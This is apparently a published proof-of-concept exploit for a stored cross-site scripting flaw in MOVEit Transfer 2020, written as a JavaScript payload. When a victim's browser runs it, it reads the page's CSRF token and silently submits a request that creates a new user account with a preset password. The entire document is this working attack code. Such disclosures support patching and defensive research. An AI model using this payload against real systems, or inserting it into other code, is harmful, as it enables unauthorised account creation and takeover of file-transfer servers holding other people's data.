//Exploit Title: MOVEit Transfer 2020 - Stored Cross-Site Scripting (XSS)
//Exploit Author: Mark Galea (mark.galea@secforce.com)
//Date: 05-08-2020

function r(){	
	alert(1);
	var uri = "human.aspx?arg12=useradd";
	xhr = new XMLHttpRequest();	
	xhr.open("GET", uri, false);	
	xhr.send(null);

	if (xhr.status === 200)
	{
		responseBody = read_body(xhr);
		firstSubStr = responseBody.substring(responseBody.indexOf("csrftoken")+18);
		csrfToken = firstSubStr.substring(0, firstSubStr.indexOf('"'));
		if (csrfToken){
			var adduserUri = "/human.aspx";
			var body="csrftoken=" + csrfToken + "&transaction=useradd&arg02=0&arg12=useradd&arg01=sectest3&arg03=sectest3&arg04=test1%40secforce.com&arg11=0&arg05=30&Opt03=en&Opt02=20&opt05=1xFEHd%5DFhhVKJm&opt04=1&Arg08=%5B9%255Sj%29%2B4%2ChAUAY3&Arg09=%5B9%255Sj%29%2B4%2ChAUAY3&opt07=%2FHome%2F%5BUSERNAME%5D&Arg10=";

			xhr2 = new XMLHttpRequest();
			xhr2.open("POST", adduserUri, false);
			xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			xhr2.send(body);
		}
	}
}

function read_body(xhr) {
	var data;
	if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	} else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	} else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	} else {
		data = xhr.response;
	}
	return data;	
}